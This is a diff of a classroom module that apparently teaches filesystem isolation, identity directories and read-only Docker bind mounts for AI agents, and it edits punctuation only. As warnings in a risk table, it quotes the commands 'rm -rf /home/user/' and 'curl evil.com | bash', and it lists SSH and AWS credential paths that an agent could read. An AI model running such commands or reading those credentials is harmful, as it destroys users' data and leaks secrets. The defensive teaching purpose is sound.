@@ -14,7 +14,7 @@ link:   https://cdn.jsdelivr.net/gh/BillJr99/Ursinus-Boilerplate-Assets@main/css
 
 # Terminal and Filesystem Isolation for Agent Safety
 
-An agent that can write to any path on your filesystem is as dangerous as a houseguest who has been handed the master key — not because they are malicious, but because a single innocent mistake (wrong room, wrong drawer) can cause damage that is difficult or impossible to undo. The key insight of filesystem isolation is not that agents are malicious — it is that agents make *mistakes*, and a mistake inside a bounded workspace is recoverable while a mistake that touches your SSH keys, your production database credentials, or your system binaries may not be.
+An agent that can write to any path on your filesystem is as dangerous as a houseguest who has been handed the master key, not because they are malicious, but because a single innocent mistake (wrong room, wrong drawer) can cause damage that is difficult or impossible to undo. The key insight of filesystem isolation is not that agents are malicious; it is that agents make *mistakes*, and a mistake inside a bounded workspace is recoverable while a mistake that touches your SSH keys, your production database credentials, or your system binaries may not be.
 
 **Blast radius** is the term security engineers use for "how much damage can one mistake cause?" A well-isolated agent has a small blast radius: even if it does something wrong, the consequences are limited to its designated workspace. This module develops the UNIX concepts, Docker primitives, and practical patterns you need to design small-blast-radius agent deployments.
 
@@ -22,7 +22,7 @@ An agent that can write to any path on your filesystem is as dangerous as a hous
 
 ## Directions and Group Roles
 
-Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Presenter**, **Reflector**). The Reflector should pay special attention to assumptions the team makes about what is "obviously safe" — in security, obvious assumptions are where vulnerabilities live. The Recorder will document the team's bash command sequence for Exercise 1. The Presenter will explain the team's answer to Question 8 to the class.
+Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Presenter**, **Reflector**). The Reflector should pay special attention to assumptions the team makes about what is "obviously safe"; in security, obvious assumptions are where vulnerabilities live. The Recorder will document the team's bash command sequence for Exercise 1. The Presenter will explain the team's answer to Question 8 to the class.
 
 ---
 
@@ -31,10 +31,10 @@ Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Present
 | Term | Plain-English Definition | Example You'll See Today |
 |------|--------------------------|--------------------------|
 | **Filesystem** | The organized hierarchy of directories and files on a computer, starting from a root (`/`) and branching into paths like `/home/user/projects/` | An agent reading `/workspace/input/data.txt` and writing results to `/workspace/output/summary.md` |
-| **Blast Radius** | The maximum amount of damage a single mistake or malicious action can cause — a small blast radius means mistakes are contained and recoverable | An agent with write access only to `/workspace/output` has a small blast radius; one with access to `/` has an unlimited blast radius |
-| **Principle of Least Privilege** | The security principle that every process should have exactly the permissions it needs to do its job — no more, no less | Giving a research agent read-only access to one knowledge base directory instead of read-write access to the entire home folder |
+| **Blast Radius** | The maximum amount of damage a single mistake or malicious action can cause; a small blast radius means mistakes are contained and recoverable | An agent with write access only to `/workspace/output` has a small blast radius; one with access to `/` has an unlimited blast radius |
+| **Principle of Least Privilege** | The security principle that every process should have exactly the permissions it needs to do its job, no more, no less | Giving a research agent read-only access to one knowledge base directory instead of read-write access to the entire home folder |
 | **Bind Mount** | A Docker feature that makes a directory from the host machine visible inside a container, optionally as read-only | `-v /home/user/data:/data:ro` makes `/home/user/data` appear as `/data` inside the container and blocks all writes |
-| **Identity Directory** | A dedicated home directory for one specific agent, containing only that agent's config, memory files, logs, and workspace — separate from every other agent's directory | `/home/user/agents/researcher/` contains only the researcher agent's files; the writer agent cannot see inside it |
+| **Identity Directory** | A dedicated home directory for one specific agent, containing only that agent's config, memory files, logs, and workspace, separate from every other agent's directory | `/home/user/agents/researcher/` contains only the researcher agent's files; the writer agent cannot see inside it |
 | **chmod** | The Linux command for changing who is allowed to read, write, or execute a file or directory | `chmod 700 /agents/researcher` means only the owning user can enter that directory; everyone else is blocked |
 
 ---
@@ -45,21 +45,21 @@ Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Present
 
 **What you will have at the end:** an agent sandbox where you can state exactly what the agent may read and write.
 
-Work through the sections in order — each one builds on the last, and the code blocks are meant to be run as you reach them, not read past.
+Work through the sections in order; each one builds on the last, and the code blocks are meant to be run as you reach them, not read past.
 
 ---
 
 ## Model 1: Filesystem Access Permissions for Three Agent Configurations
 
-The three configurations below represent a spectrum from minimal to dangerous. Each row describes a real deployment pattern. The filesystem is the agent's workspace — getting permissions wrong is like giving a houseguest the master key to your house instead of a key to just the guest room. Study the access model and the resulting risk level before answering questions.
+The three configurations below represent a spectrum from minimal to dangerous. Each row describes a real deployment pattern. The filesystem is the agent's workspace; getting permissions wrong is like giving a houseguest the master key to your house instead of a key to just the guest room. Study the access model and the resulting risk level before answering questions.
 
-Study the Risk Level and "Why This Risk Level" columns first, then work backward to understand which access rules produced that risk level — this reverse-reading reveals the security reasoning more clearly than reading left to right.
+Study the Risk Level and "Why This Risk Level" columns first, then work backward to understand which access rules produced that risk level; this reverse-reading reveals the security reasoning more clearly than reading left to right.
 
 | Agent Type | Filesystem Access | Network Access | Can Execute Shell? | Risk Level | Why This Risk Level |
 |---|---|---|---|---|---|
-| **Research Agent** | Read-only bind mount of `/home/user/knowledgebase` only; the agent cannot write to any path on the system | Outbound HTTPS to a whitelist of approved domains only; all other network traffic is blocked | No — the agent can only call registered tool functions; it cannot run `subprocess` or `exec` commands | Low | The agent can read stale data and produce wrong answers, but it cannot modify files, steal secrets it cannot reach, or install malware; mistakes are safe to recover from |
-| **Writer Agent** | Write access to `/workspace/output` only; read access to `/workspace/input` (read-only flag set); no access to any other part of the filesystem | No network access at all — the agent is fully air-gapped from the internet | No — tool calls only, no shell access | Low-Medium | A hallucinated or incorrect output goes into `/workspace/output` and can be reviewed before use; the agent cannot read secrets elsewhere on the system or send data to an attacker |
-| **Admin Agent** | Full read-write access to `/` — the root of the entire filesystem, including system directories | Unrestricted outbound network access to any address on the internet | Yes — can run arbitrary shell commands including `rm`, `curl`, `python`, and `ssh` | Critical | A single hallucinated command (`rm -rf /home/user/` or `curl evil.com \| bash`) is unrecoverable and could destroy the system, steal all credentials, or install persistent malware; there is no ceiling on how bad a mistake can be |
+| **Research Agent** | Read-only bind mount of `/home/user/knowledgebase` only; the agent cannot write to any path on the system | Outbound HTTPS to a whitelist of approved domains only; all other network traffic is blocked | No: the agent can only call registered tool functions; it cannot run `subprocess` or `exec` commands | Low | The agent can read stale data and produce wrong answers, but it cannot modify files, steal secrets it cannot reach, or install malware; mistakes are safe to recover from |
+| **Writer Agent** | Write access to `/workspace/output` only; read access to `/workspace/input` (read-only flag set); no access to any other part of the filesystem | No network access at all: the agent is fully air-gapped from the internet | No: tool calls only, no shell access | Low-Medium | A hallucinated or incorrect output goes into `/workspace/output` and can be reviewed before use; the agent cannot read secrets elsewhere on the system or send data to an attacker |
+| **Admin Agent** | Full read-write access to `/`, the root of the entire filesystem, including system directories | Unrestricted outbound network access to any address on the internet | Yes: can run arbitrary shell commands including `rm`, `curl`, `python`, and `ssh` | Critical | A single hallucinated command (`rm -rf /home/user/` or `curl evil.com \| bash`) is unrecoverable and could destroy the system, steal all credentials, or install persistent malware; there is no ceiling on how bad a mistake can be |
 
 ### Critical Thinking Questions
 
@@ -81,11 +81,11 @@ Study the Risk Level and "Why This Risk Level" columns first, then work backward
 
 Each agent in a multi-agent system should have its own **identity directory**: a home directory that contains only that agent's configuration, memory files, logs, and workspace. Agents that share a home directory can accidentally read each other's memory or logs, creating information leakage between agents that were designed to be independent.
 
-Think of identity directories like individual lockers in a school — each student (agent) has their own locker and cannot open anyone else's. The teacher (the orchestrator) has a master key but only uses it when necessary.
+Think of identity directories like individual lockers in a school: each student (agent) has their own locker and cannot open anyone else's. The teacher (the orchestrator) has a master key but only uses it when necessary.
 
-The following terminal session sets up a two-agent workspace with isolated identity directories. Read each comment carefully — the comments explain *why* each command is written the way it is, not just *what* it does.
+The following terminal session sets up a two-agent workspace with isolated identity directories. Read each comment carefully; the comments explain *why* each command is written the way it is, not just *what* it does.
 
-The following terminal session creates two agent identity directories with restrictive permissions, then runs each agent in a Docker container with carefully scoped mounts. Read the comments inside the code — each one explains a security decision, not just a syntax choice.
+The following terminal session creates two agent identity directories with restrictive permissions, then runs each agent in a Docker container with carefully scoped mounts. Read the comments inside the code; each one explains a security decision, not just a syntax choice.
 
 ```bash
 # Create the top-level agents directory under the project root
@@ -117,10 +117,10 @@ mkdir -p /home/user/projects/myapp/shared/output
 chmod 750 /home/user/projects/myapp/shared/output
 
 # Run the researcher agent in a Docker container with carefully chosen volume mounts:
-# -v .../researcher:/home/agent:rw  → researcher's own identity dir, read-write (it can save memory/logs)
-# -v .../knowledgebase:/data/kb:ro  → shared knowledge base, READ-ONLY (it cannot change the source docs)
-# --network none                    → no internet access (prevents data exfiltration)
-# The writer's identity directory is NOT mounted here — researcher literally cannot see it
+# -v .../researcher:/home/agent:rw  -> researcher's own identity dir, read-write (it can save memory/logs)
+# -v .../knowledgebase:/data/kb:ro  -> shared knowledge base, READ-ONLY (it cannot change the source docs)
+# --network none                    -> no internet access (prevents data exfiltration)
+# The writer's identity directory is NOT mounted here; researcher literally cannot see it
 docker run --rm \
   -v /home/user/projects/myapp/agents/researcher:/home/agent:rw \
   -v /home/user/projects/myapp/shared/knowledgebase:/data/kb:ro \
@@ -130,9 +130,9 @@ docker run --rm \
 # Expected: the agent runs, writes summaries to /home/agent/workspace/, exits cleanly
 
 # Run the writer agent with its own separate set of mounts:
-# -v .../writer:/home/agent:rw           → writer's own identity dir, read-write
-# -v .../shared/output:/workspace/output:rw  → shared output dir, read-write (writer produces files here)
-# -v .../researcher/workspace:/workspace/input:ro  → researcher's OUTPUT only, read-only
+# -v .../writer:/home/agent:rw           -> writer's own identity dir, read-write
+# -v .../shared/output:/workspace/output:rw  -> shared output dir, read-write (writer produces files here)
+# -v .../researcher/workspace:/workspace/input:ro  -> researcher's OUTPUT only, read-only
 # Notice: the writer gets researcher's WORKSPACE (output files), NOT researcher's config or memory
 docker run --rm \
   -v /home/user/projects/myapp/agents/writer:/home/agent:rw \
@@ -144,7 +144,7 @@ docker run --rm \
 # Expected: the agent reads summaries from /workspace/input/, writes a draft to /workspace/output/
 ```
 
-The table below maps the same physical directories to what each agent sees inside its container. Notice that some paths on the host are completely invisible to one agent — Docker's mount system enforces this, not convention.
+The table below maps the same physical directories to what each agent sees inside its container. Notice that some paths on the host are completely invisible to one agent; Docker's mount system enforces this, not convention.
 
 **Before vs. After: What the Agent Can See**
 
@@ -156,7 +156,7 @@ The table below maps the same physical directories to what each agent sees insid
 | `/home/user/projects/myapp/agents/researcher/workspace/` | `/home/agent/workspace/` (read-write) | `/workspace/input/` (read-only) |
 | `/home/user/projects/myapp/shared/output/` | Not visible at all | `/workspace/output/` (read-write) |
 
-> **⚠️ Common Misconception:** Many students assume that "running in Docker" automatically prevents an agent from accessing sensitive files. It does not — Docker only isolates what you tell it to isolate. If you mount `/home/user:/home/user`, the agent inside the container can read your SSH keys, browser cookies, and git credentials just as easily as if Docker were not there at all. The safety comes from choosing restrictive mounts, not from Docker itself.
+> **Common Misconception:** Many students assume that "running in Docker" automatically prevents an agent from accessing sensitive files. It does not: Docker only isolates what you tell it to isolate. If you mount `/home/user:/home/user`, the agent inside the container can read your SSH keys, browser cookies, and git credentials just as easily as if Docker were not there at all. The safety comes from choosing restrictive mounts, not from Docker itself.
 
 ### Critical Thinking Questions
 
@@ -166,7 +166,7 @@ The table below maps the same physical directories to what each agent sees insid
 
 5. Both agents run with `--network none`. Now suppose the researcher needs to call a web search API to find recent papers. Rewrite the researcher's `docker run` command to allow *only* outbound HTTPS traffic to `api.searchprovider.com`, and describe what additional piece of infrastructure (not a Docker flag) would actually be needed to enforce this at the network level.
 
-   *Hint: `--network none` is a binary switch — network on or network off. To allow only one specific destination, you need something that can inspect network packets and block everything except traffic to one IP address. What kind of network component does that?*
+   *Hint: `--network none` is a binary switch: network on or network off. To allow only one specific destination, you need something that can inspect network packets and block everything except traffic to one IP address. What kind of network component does that?*
 
 6. Log files in `agents/researcher/logs/` accumulate over time and record everything the agent did during a run. Explain why these logs function as an **audit trail**, and describe two specific, concrete things a security engineer could learn from reviewing them after a suspicious agent run.
 
@@ -174,14 +174,14 @@ The table below maps the same physical directories to what each agent sees insid
 
 An agent's **identity directory** is designed to:
 
-[( )] Give the agent access to the entire user home directory for maximum flexibility — mounting `/home/user` gives each agent a consistent, full-featured environment to work in
-[( )] Store the agent's model weights and embedding indices — keeping model artifacts in the identity directory ensures the agent always uses the correct model version
+[( )] Give the agent access to the entire user home directory for maximum flexibility; mounting `/home/user` gives each agent a consistent, full-featured environment to work in
+[( )] Store the agent's model weights and embedding indices; keeping model artifacts in the identity directory ensures the agent always uses the correct model version
 [(X)] Provide each agent with an isolated space for its own config, memory, logs, and workspace so agents cannot accidentally access each other's state
-[( )] Replace Docker isolation as a lighter-weight alternative — identity directories provide the same filesystem isolation as Docker without the container overhead
+[( )] Replace Docker isolation as a lighter-weight alternative; identity directories provide the same filesystem isolation as Docker without the container overhead
 
 ---
 
-## Model 3: Docker Volume Mounts — What Can the Agent Touch?
+## Model 3: Docker Volume Mounts - What Can the Agent Touch?
 
 Two students are deploying the same researcher agent. Their Docker commands look similar but have dramatically different security properties. Study the difference carefully.
 
@@ -193,7 +193,7 @@ The two `docker run` commands below implement the same agent with dramatically d
 
 ```bash
 # Student A mounts their ENTIRE home directory into the container
-# The agent inside the container sees /home/user — which includes:
+# The agent inside the container sees /home/user, which includes:
 #   - SSH private keys at ~/.ssh/id_rsa (used to authenticate to servers)
 #   - AWS credentials at ~/.aws/credentials (used to access cloud services)
 #   - Git config at ~/.gitconfig (contains name, email, and sometimes tokens)
@@ -208,8 +208,8 @@ docker run --rm \
 
 ```bash
 # Student B mounts ONLY the researcher's specific workspace directory
-# :ro at the end means read-only — even if the agent tries to write, it will get a permission error
-# The agent inside the container sees /workspace — which contains ONLY:
+# :ro at the end means read-only; even if the agent tries to write, it will get a permission error
+# The agent inside the container sees /workspace, which contains ONLY:
 #   - The files the researcher was given to work with
 #   - Nothing else from the host machine
 docker run --rm \
@@ -218,18 +218,18 @@ docker run --rm \
   python agent.py
 ```
 
-| Question | Student A — What Actually Happens | Student B — What Actually Happens |
+| Question | Student A: What Actually Happens | Student B: What Actually Happens |
 |---|---|---|
-| What path does the agent see inside the container? | `/home/user` — the agent's view of the filesystem matches the real home directory exactly | `/workspace` — the agent can only see the single researcher directory, renamed to `/workspace` inside the container |
-| Can the agent read `~/.ssh/id_rsa` (private SSH key)? | Yes — SSH keys are in `/home/user/.ssh/` which is fully mounted; the agent can read and transmit the key | No — only `/workspace` is mounted; `~/.ssh/` does not exist inside this container |
-| Can the agent read `~/.aws/credentials` (AWS access keys)? | Yes — AWS credentials live in the mounted home directory and are fully readable | No — only `/workspace` is mounted; `.aws/` does not exist inside this container |
-| Can the agent modify files it can read? | Yes — no `:ro` flag was used, so all mounted files are read-write by default | No — the `:ro` flag makes the entire mount read-only; any write attempt returns "Read-only file system" error |
+| What path does the agent see inside the container? | `/home/user`: the agent's view of the filesystem matches the real home directory exactly | `/workspace`: the agent can only see the single researcher directory, renamed to `/workspace` inside the container |
+| Can the agent read `~/.ssh/id_rsa` (private SSH key)? | Yes: SSH keys are in `/home/user/.ssh/` which is fully mounted; the agent can read and transmit the key | No: only `/workspace` is mounted; `~/.ssh/` does not exist inside this container |
+| Can the agent read `~/.aws/credentials` (AWS access keys)? | Yes: AWS credentials live in the mounted home directory and are fully readable | No: only `/workspace` is mounted; `.aws/` does not exist inside this container |
+| Can the agent modify files it can read? | Yes: no `:ro` flag was used, so all mounted files are read-write by default | No: the `:ro` flag makes the entire mount read-only; any write attempt returns "Read-only file system" error |
 | If the agent hallucinates a destructive write command like `rm -rf /home/user/documents`, what is damaged? | Every file in `/home/user/documents/` is permanently deleted, including all projects and personal files | The write attempt fails immediately with a permission error; no files are changed |
-| What is the blast radius of the worst possible agent action? | Unlimited within the user's home directory — every file, credential, and project is at risk | Zero for writes (read-only mount) — the agent literally cannot change anything on the host |
+| What is the blast radius of the worst possible agent action? | Unlimited within the user's home directory: every file, credential, and project is at risk | Zero for writes (read-only mount): the agent literally cannot change anything on the host |
 
 ### Critical Thinking Questions
 
-7. Student A's mount exposes `~/.gitconfig`, which contains the user's name and email address. This seems harmless — it is not a password or a private key. Describe a concrete scenario where an agent with read access to `.gitconfig` *and* write access to a git repository could use that information in a way the user did not intend.
+7. Student A's mount exposes `~/.gitconfig`, which contains the user's name and email address. This seems harmless; it is not a password or a private key. Describe a concrete scenario where an agent with read access to `.gitconfig` *and* write access to a git repository could use that information in a way the user did not intend.
 
    *Hint: Git uses the name and email from `.gitconfig` when creating commits. If the agent can make commits on your behalf using your name and email, what could it commit, and whose reputation would be affected?*
 
@@ -250,7 +250,7 @@ docker run --rm \
 
 9. Two agents share a single read-write filesystem volume mounted at `/shared/output`. Agent 1 writes a file called `draft.md` containing its summary. Agent 2 also writes a file called `draft.md` containing its own different summary. Describe exactly what happens at the filesystem level when Agent 2 writes its file, and explain why this is a problem for the pipeline. What naming convention or coordination mechanism would prevent this collision?
 
-   *Hint: Filesystems do not lock files between separate processes by default — one process can silently overwrite another's file. What information that each agent already has could be used to create a unique filename that avoids collisions?*
+   *Hint: Filesystems do not lock files between separate processes by default; one process can silently overwrite another's file. What information that each agent already has could be used to create a unique filename that avoids collisions?*
 
 ---
 
@@ -275,7 +275,7 @@ docker run --rm \
 
 2. **Blast radius calculation.**
 
-   *What to do:* For each of the following agent configurations, calculate and justify the blast radius — the maximum damage a single bad command could cause. Rank the three configurations from safest to most dangerous.
+   *What to do:* For each of the following agent configurations, calculate and justify the blast radius: the maximum damage a single bad command could cause. Rank the three configurations from safest to most dangerous.
 
    - (a) Agent runs as root inside a container with `docker run -v /:/host` (the entire host filesystem mounted).
    - (b) Agent runs as non-root user `agentuser` with write access only to `/workspace/output`.
@@ -289,7 +289,7 @@ docker run --rm \
 
    *What to do:* An agent writes its working notes to `memory/notes.md` and its completed task list to `memory/completed.json` inside its identity directory. Compare this approach to keeping all state in the LLM's in-context memory (the conversation history). List two advantages and two disadvantages of each approach. Then answer: when would you prefer file-based memory, and when would you prefer in-context memory?
 
-   *Starter hint:* Think about what happens when the agent's conversation runs too long and older context scrolls out. File-based memory persists across sessions; in-context memory is lost when the conversation ends. But file-based memory must be read back into context explicitly — it is not automatically available to the model.
+   *Starter hint:* Think about what happens when the agent's conversation runs too long and older context scrolls out. File-based memory persists across sessions; in-context memory is lost when the conversation ends. But file-based memory must be read back into context explicitly; it is not automatically available to the model.
 
    *You've succeeded when* you have a concrete scenario for each approach where one is clearly better than the other.
 
@@ -297,23 +297,23 @@ docker run --rm \
 
 ## Reflection Prompt
 
-*Personal:* The principle of least privilege says every process should have exactly the access it needs and nothing more. Think of a role you have held — a job, a club, a sports team — where you had more access, information, or authority than you needed to do your part. Did that excess access create any risks you were aware of at the time?
+*Personal:* The principle of least privilege says every process should have exactly the access it needs and nothing more. Think of a role you have held (a job, a club, a sports team) where you had more access, information, or authority than you needed to do your part. Did that excess access create any risks you were aware of at the time?
 
 *Technical:* Today we applied least privilege to Docker volume mounts. Describe a specific scenario where a developer, in a hurry, would be tempted to use Student A's approach (mounting the full home directory) instead of Student B's approach. What pressure leads to that shortcut, and what would a safe-by-default tooling design look like that makes the restrictive option easier than the permissive one?
 
-*Societal:* Filesystem isolation limits what an AI agent can do on your personal machine. But many agents operate on cloud infrastructure where "the filesystem" is a database or an object store shared by thousands of users. What is the equivalent of "identity directories" in a multi-tenant cloud environment, and who is responsible for enforcing those boundaries — the cloud provider, the application developer, or the user?
+*Societal:* Filesystem isolation limits what an AI agent can do on your personal machine. But many agents operate on cloud infrastructure where "the filesystem" is a database or an object store shared by thousands of users. What is the equivalent of "identity directories" in a multi-tenant cloud environment, and who is responsible for enforcing those boundaries: the cloud provider, the application developer, or the user?
 
 > *Hint:* Consider what "tenant isolation" means in a shared database: each tenant's rows are stored in the same physical tables, but a row-level security policy ensures queries only return that tenant's data. Is that the same guarantee as a Docker volume mount, or a weaker one?
 
 ---
 
-→ Coming Up Next: Identity directories and bind mounts are filesystem-level controls. The next activity zooms out to the container level — examining what Docker's namespace and cgroup isolation actually guarantees, and what it leaves unprotected, when the process inside is an AI agent that can generate and execute code.
+-> Coming Up Next: Identity directories and bind mounts are filesystem-level controls. The next activity zooms out to the container level, examining what Docker's namespace and cgroup isolation actually guarantees, and what it leaves unprotected, when the process inside is an AI agent that can generate and execute code.
 
 ---
 
 ## Further Reading
 
-- "The Principle of Least Privilege." OWASP Top Ten documentation. https://owasp.org/www-project-developer-guide/draft/design/web_app_checklist/digital_identity/ — foundational security principle applied throughout this module.
-- Docker Documentation: "Use volumes." https://docs.docker.com/storage/volumes/ — specifically the sections on bind mounts vs. named volumes and read-only mounts.
-- Julia Evans. "How containers work: overlayfs." https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ — intuitive explanation of what Docker isolation actually does at the filesystem level.
-- Saltzer and Schroeder. "The Protection of Information in Computer Systems." *Proceedings of the IEEE* (1975). The original paper enumerating least privilege, fail-safe defaults, and economy of mechanism — principles that are fifty years old and still directly applicable to agent design.
+- "The Principle of Least Privilege." OWASP Top Ten documentation. https://owasp.org/www-project-developer-guide/draft/design/web_app_checklist/digital_identity/, foundational security principle applied throughout this module.
+- Docker Documentation: "Use volumes." https://docs.docker.com/storage/volumes/, specifically the sections on bind mounts vs. named volumes and read-only mounts.
+- Julia Evans. "How containers work: overlayfs." https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/, intuitive explanation of what Docker isolation actually does at the filesystem level.
+- Saltzer and Schroeder. "The Protection of Information in Computer Systems." *Proceedings of the IEEE* (1975). The original paper enumerating least privilege, fail-safe defaults, and economy of mechanism, principles that are fifty years old and still directly applicable to agent design.
